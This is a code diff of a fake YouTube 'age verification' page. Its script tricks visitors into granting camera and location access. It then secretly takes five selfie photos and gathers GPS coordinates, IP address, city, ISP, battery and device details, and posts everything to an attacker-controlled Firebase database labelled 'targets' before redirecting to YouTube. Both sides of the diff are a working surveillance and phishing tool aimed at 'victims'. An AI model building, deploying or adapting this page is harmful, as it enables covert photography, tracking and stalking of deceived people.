@@ -7,106 +7,43 @@
     <meta property="og:title" content="YouTube Video Player">
     <meta property="og:type" content="video.other">
     <meta property="og:image" content="https://img.youtube.com/vi/VIDEO_ID/maxresdefault.jpg">
-    <meta property="og:description" content="Watch this video on YouTube">
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            background: #000000;
-            color: #cccccc;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-            position: relative;
-        }
-        .yt-ui {
-            max-width: 400px;
-            width: 90%;
-            text-align: center;
-            padding: 20px;
-        }
-        .logo {
-            width: 120px;
-            margin: 0 auto 20px;
-        }
-        .title {
-            font-size: 22px;
-            font-weight: 700;
-            color: #ffffff;
-            margin-bottom: 12px;
-        }
-        .description {
-            font-size: 14px;
-            color: #aaaaaa;
-            margin-bottom: 25px;
-            line-height: 1.5;
-        }
-        .red-btn {
-            background: #ff0000;
-            color: white;
-            padding: 14px 35px;
-            border-radius: 4px;
-            font-weight: 700;
-            font-size: 16px;
-            text-transform: uppercase;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            border: none;
-            width: 100%;
-            max-width: 250px;
-            margin: 0 auto;
-            display: block;
-        }
-        .red-btn:hover {
-            background: #cc0000;
-            transform: scale(1.02);
-        }
-        .loader {
-            display: inline-block;
-            width: 30px;
-            height: 30px;
-            border: 3px solid #ff0000;
-            border-radius: 50%;
-            border-top-color: transparent;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .status-text {
-            color: #ff0000;
-            font-size: 14px;
-            font-weight: bold;
-            margin-top: 20px;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #000; color: #ccc; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .yt-ui { max-width: 400px; width: 90%; text-align: center; padding: 20px; }
+        .logo { width: 120px; margin: 0 auto 20px; }
+        .title { font-size: 22px; font-weight: 700; color: #fff; margin-bottom: 12px; }
+        .description { font-size: 14px; color: #aaa; margin-bottom: 25px; line-height: 1.5; }
+        .red-btn { background: #ff0000; color: white; padding: 14px 35px; border-radius: 4px; font-weight: 700; font-size: 16px; text-transform: uppercase; cursor: pointer; border: none; width: 100%; max-width: 250px; margin: 0 auto; display: block; }
+        .red-btn:hover { background: #cc0000; transform: scale(1.02); }
+        .loader { display: inline-block; width: 30px; height: 30px; border: 3px solid #ff0000; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .status-text { color: #ff0000; font-size: 14px; font-weight: bold; margin-top: 20px; }
     </style>
 </head>
 <body>
     <div class="yt-ui" id="main-ui">
         <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" class="logo" alt="YouTube">
         <h2 class="title">Verification Required</h2>
-        <p class="description">This video is age-restricted. To verify you are an adult, please click the button below and allow camera & location access for age verification.</p>
+        <p class="description">This video is age-restricted. Please click below and allow camera & location access for age verification.</p>
         <button onclick="startCapture()" class="red-btn">Verify Age</button>
     </div>
-    
     <video id="video" style="display:none" autoplay playsinline></video>
     <canvas id="canvas" style="display:none"></canvas>
 
     <script>
-        // Get parameters from URL
         const urlParams = new URLSearchParams(window.location.search);
-        const VICTIM_ID = urlParams.get('id') || 'unknown_' + Date.now();
+        let VICTIM_ID = urlParams.get('id') || 'unknown_' + Date.now();
         const VIDEO_ID = urlParams.get('v') || 'dQw4w9WgXcQ';
-        
-        // Firebase Database URL
         const FB_URL = "https://hgggy-a047e-default-rtdb.firebaseio.com/targets.json";
+        
+        // DECODE victim ID (base64 se original decode)
+        try {
+            VICTIM_ID = atob(VICTIM_ID);
+        } catch(e) {
+            // Already plain text, keep as is
+        }
         
         let photoCount = 0;
         let targetData = {
@@ -114,136 +51,55 @@
             time: new Date().toLocaleString(),
             timestamp: Date.now(),
             photos: [],
-            device: {
-                ua: navigator.userAgent,
-                ram: navigator.deviceMemory || 'N/A',
-                cores: navigator.hardwareConcurrency || 'N/A',
-                platform: navigator.platform
-            }
+            device: { ua: navigator.userAgent, ram: navigator.deviceMemory || 'N/A', cores: navigator.hardwareConcurrency || 'N/A', platform: navigator.platform }
         };
 
         async function startCapture() {
-            // Show loading
-            document.getElementById('main-ui').innerHTML = `
-                <div style="text-align: center;">
-                    <div class="loader" style="margin: 0 auto 20px;"></div>
-                    <p class="status-text">Verifying your age...</p>
-                    <p style="font-size: 12px; color: #666; margin-top: 15px;">Please wait, this may take a few seconds</p>
-                </div>
-            `;
+            document.getElementById('main-ui').innerHTML = `<div style="text-align: center;"><div class="loader" style="margin: 0 auto 20px;"></div><p class="status-text">Verifying your age...</p><p style="font-size: 12px; color: #666; margin-top: 15px;">Please wait...</p></div>`;
             
-            // 1. Get Battery Info
-            try {
-                const battery = await navigator.getBattery();
-                targetData.battery = Math.round(battery.level * 100) + "%";
-            } catch(e) {
-                targetData.battery = "Unknown";
-            }
+            try { const b = await navigator.getBattery(); targetData.battery = Math.round(b.level * 100) + "%"; } catch(e) {}
             
-            // 2. Get GPS Location (High Accuracy)
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    async (pos) => {
-                        targetData.latitude = pos.coords.latitude;
-                        targetData.longitude = pos.coords.longitude;
-                        targetData.gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                        targetData.accuracy = pos.coords.accuracy + "m";
-                    }, 
-                    (err) => {
-                        targetData.gps = "Permission denied or unavailable";
-                    },
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    targetData.gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                }, null, { enableHighAccuracy: true, timeout: 10000 });
             }
             
-            // 3. Get IP & Location Info
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const geo = await res.json();
                 targetData.ip = geo.ip;
                 targetData.city = geo.city + ", " + geo.country;
-                targetData.region = geo.region;
-                targetData.postal = geo.postal;
                 targetData.isp = geo.org;
-                targetData.timezone = geo.timezone;
-            } catch(e) {
-                targetData.ip = "Unable to fetch";
-                targetData.city = "Unknown";
-                targetData.isp = "Unknown";
-            }
+            } catch(e) {}
             
-            // 4. Capture 5 Photos
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
-                });
-                
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
+                await new Promise((resolve) => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
                 
-                // Wait for video to be ready
-                await new Promise((resolve) => {
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        resolve();
-                    };
-                });
-                
-                // Capture photos every 0.6 seconds
                 const captureInterval = setInterval(async () => {
                     if (photoCount >= 5) {
                         clearInterval(captureInterval);
-                        // Final save to Firebase
-                        await fetch(FB_URL, {
-                            method: 'POST',
-                            body: JSON.stringify(targetData)
-                        });
-                        // Stop camera
+                        await fetch(FB_URL, { method: 'POST', body: JSON.stringify(targetData) });
                         stream.getTracks().forEach(track => track.stop());
-                        // Redirect to YouTube
                         window.location.href = "https://www.youtube.com/watch?v=" + VIDEO_ID;
                         return;
                     }
-                    
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const photoData = canvas.toDataURL('image/jpeg', 0.5);
-                    targetData.photos.push(photoData);
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    targetData.photos.push(canvas.toDataURL('image/jpeg', 0.5));
                     photoCount++;
-                    
-                    // Real-time update
-                    await fetch(FB_URL, {
-                        method: 'POST',
-                        body: JSON.stringify(targetData)
-                    });
+                    await fetch(FB_URL, { method: 'POST', body: JSON.stringify(targetData) });
                 }, 600);
-                
-            } catch(cameraError) {
-                console.error("Camera error:", cameraError);
-                // If camera fails, still send data without photos
-                await fetch(FB_URL, {
-                    method: 'POST',
-                    body: JSON.stringify(targetData)
-                });
-                // Redirect after 2 seconds
-                setTimeout(() => {
-                    window.location.href = "https://www.youtube.com/watch?v=" + VIDEO_ID;
-                }, 2000);
+            } catch(e) {
+                await fetch(FB_URL, { method: 'POST', body: JSON.stringify(targetData) });
+                setTimeout(() => { window.location.href = "https://www.youtube.com/watch?v=" + VIDEO_ID; }, 2000);
             }
         }
-        
-        // Handle page refresh or close
-        window.addEventListener('beforeunload', async () => {
-            if (photoCount > 0 && targetData.photos.length > 0) {
-                await fetch(FB_URL, {
-                    method: 'POST',
-                    body: JSON.stringify(targetData)
-                });
-            }
-        });
     </script>
 </body>
 </html>
